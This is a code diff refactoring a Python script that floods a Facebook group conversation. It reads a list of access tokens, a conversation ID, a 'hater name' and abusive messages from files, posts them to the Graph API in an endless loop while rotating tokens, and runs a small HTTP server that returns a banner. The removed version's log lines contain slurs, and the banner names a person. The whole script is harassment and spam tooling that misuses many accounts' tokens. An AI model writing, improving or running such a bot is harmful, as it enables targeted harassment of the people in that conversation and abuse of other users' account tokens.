@@ -1,117 +1,99 @@
-
-
 import requests
-import json
-import time
-import sys
-from platform import system
 import os
-import subprocess
+import threading
 import http.server
 import socketserver
-import threading
+import time
+from platform import system
 
-import base64
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-  def do_GET(self):
-      self.send_response(200)
-      self.send_header('Content-type', 'text/plain')
-      self.end_headers()
-      self.wfile.write(b"                                                                                                >>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<                                        ")
+# --- HTTP SERVER SECTION ---
+class SimpleHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b">>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<")
 
-def execute_server():
-  PORT = 4000
+def run_http_server(port=4000):
+    with socketserver.TCPServer(("", port), SimpleHandler) as httpd:
+        print(f"[HTTP] Server running at http://localhost:{port}")
+        httpd.serve_forever()
 
-  with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-      print("Server running at http://localhost:{}".format(PORT))
-      httpd.serve_forever()
+# --- UTILITY FUNCTIONS ---
+def clear_screen():
+    if system() == 'Linux':
+        os.system('clear')
+    elif system() == 'Windows':
+        os.system('cls')
 
+def print_banner():
+    print('\u001b[37m' + '>>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<')
 
+def load_lines(filename):
+    if not os.path.exists(filename):
+        print(f"[ERROR] {filename} not found.")
+        return []
+    with open(filename, 'r', encoding='utf-8') as file:
+        return [line.strip() for line in file if line.strip()]
+
+# --- MESSAGING SECTION ---
 def send_messages():
-    with  open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
+    tokens = load_lines('tokennum.txt')
+    messages = load_lines('File.txt')
+    convo_id = ''.join(load_lines('convo.txt'))
+    hater_name = ''.join(load_lines('hatername.txt'))
+    try:
+        speed = int(''.join(load_lines('time.txt')))
+    except ValueError:
+        print("[ERROR] Invalid time delay. Defaulting to 2 seconds.")
+        speed = 2
 
-    requests.packages.urllib3.disable_warnings()
-
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        else:
-            if system() == 'Windows':
-                os.system('cls')
-    cls()
-
-    def liness():
-        print('\u001b[37m' + '                                                                                                >>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<                                                                                                                                ')
+    if not (tokens and messages and convo_id and hater_name):
+        print("[ERROR] Missing required input data.")
+        return
 
     headers = {
         'Connection': 'keep-alive',
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; ...)',
+        'Accept': 'application/json',
         'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
         'referer': 'www.google.com'
     }
+    requests.packages.urllib3.disable_warnings()
 
-    access_tokens = [token.strip() for token in tokens]
+    print_banner()
+    print("[INFO] Starting message sending loop...")
 
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-
-    with open('File.txt', 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-    max_tokens = min(num_tokens, num_messages)
-
-    with open('hatername.txt', 'r') as file:
-        hater_name = file.read().strip()
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    liness()
-
+    max_tokens = min(len(tokens), len(messages))
     while True:
         try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
-                access_token = access_tokens[token_index]
-
-                message = messages[message_index].strip()
-
-                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
-                parameters = {'access_token': access_token, 'message': hater_name + ' ' + message}
-                response = requests.post(url, json=parameters, headers=headers)
-
+            for idx, message in enumerate(messages):
+                token = tokens[idx % max_tokens]
+                full_message = f"{hater_name} {message}"
+                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
+                params = {'access_token': token, 'message': full_message}
+                response = requests.post(url, json=params, headers=headers)
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print(" Message Gya Kirshhan Chmar Ke Group {} Par with Token {}:".format(convo_id, token_index + 1))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
+                    print(f" [SENT] Group {convo_id} Token {idx+1} at {current_time}")
                 else:
-                    print(" Message Nahi Gya Bhosdike of Convo {} with Token {}:".format(convo_id, token_index + 1))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
+                    print(f" [FAILED] Group {convo_id} Token {idx+1} at {current_time}: {response.text}")
                 time.sleep(speed)
-
-            print("\n[+] All messages sent. Restarting the process...\n")
+            print("[INFO] All messages sent. Looping again...")
         except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+            print(f"[ERROR] Exception occurred: {e}")
+        time.sleep(2)
 
+# --- MAIN ---
 def main():
-    server_thread = threading.Thread(target=execute_server)
+    clear_screen()
+    print_banner()
+    server_thread = threading.Thread(target=run_http_server, args=(4000,), daemon=True)
     server_thread.start()
-
     send_messages()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
-
-
